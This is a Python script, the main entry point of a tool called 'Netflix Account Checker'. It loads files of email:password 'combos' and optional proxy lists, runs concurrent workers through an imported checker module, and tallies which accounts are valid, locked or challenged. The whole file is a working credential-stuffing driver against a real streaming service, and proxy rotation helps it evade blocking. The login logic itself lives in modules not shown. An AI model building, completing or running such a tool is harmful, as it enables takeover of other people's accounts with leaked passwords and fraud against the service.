"""
Netflix Account Checker - Main Entry Point
"""
import asyncio
import argparse
import sys
from pathlib import Path
from typing import List

from checker import AccountChecker
from proxy_manager import ProxyManager
from checker_utils import load_combos, save_result, setup_logging, get_results_file


async def main():
    parser = argparse.ArgumentParser(description="Netflix Account Checker")
    parser.add_argument("-c", "--combos", required=True, help="Combo file path (email:password)")
    parser.add_argument("-p", "--proxies", help="Proxy file path (format: ip:port or protocol://ip:port)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent workers")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
    parser.add_argument("--max-retries", type=int, default=3, help="Max retries per account")
    parser.add_argument("-o", "--output-dir", default=".", help="Output directory for results")

    args = parser.parse_args()

    # Setup logging
    logger = setup_logging()
    logger.info(f"Starting Netflix Account Checker with {args.threads} threads")

    # Load combos
    combos = load_combos(args.combos)
    if not combos:
        logger.error("No valid combos found")
        sys.exit(1)

    logger.info(f"Loaded {len(combos)} combos")

    # Load proxies
    proxy_manager = None
    if args.proxies:
        proxy_manager = ProxyManager(args.proxies)
        logger.info(f"Loaded {len(proxy_manager.proxies)} proxies")
    else:
        logger.info("No proxies provided - using direct connection")

    # Create checker
    checker = AccountChecker(
        proxy_manager=proxy_manager,
        timeout=args.timeout,
        max_retries=args.max_retries,
        max_workers=args.threads,
        output_dir=args.output_dir
    )

    # Process accounts
    results = await checker.check_accounts(combos)

    # Summary
    logger.info("=" * 50)
    logger.info("CHECKING COMPLETE")
    logger.info(f"Total: {len(combos)}")
    logger.info(f"Valid: {results['valid']}")
    logger.info(f"Invalid: {results['invalid']}")
    logger.info(f"Locked: {results['locked']}")
    logger.info(f"Challenge: {results['challenge']}")
    logger.info(f"Error: {results['error']}")
    logger.info("=" * 50)

    # Close proxy manager
    if proxy_manager:
        proxy_manager.close()


if __name__ == "__main__":
    asyncio.run(main())
